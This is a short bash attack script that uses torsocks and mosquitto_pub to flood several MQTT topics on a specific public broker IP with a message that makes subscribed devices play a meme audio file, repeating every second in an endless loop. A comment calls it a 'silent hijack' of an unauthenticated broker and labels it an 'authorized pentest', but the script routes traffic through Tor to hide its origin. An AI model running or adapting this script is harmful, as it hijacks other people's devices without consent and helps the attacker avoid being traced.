#!/bin/bash
# PEPPE_VOV_NUKE.sh - No auth, silent hijack (Authorized pentest)

PEPPE='{"n":"88171961789418494:s:16","m":"audio/mpeg","u":"https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"}'

while true; do
  torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "88171961789418494:s:16" -m "$PEPPE" -q
  torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "88171961789418495:s:16" -m "$PEPPE" -q
  torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "17541961789418494:s:16" -m "$PEPPE" -q
  sleep 1
done
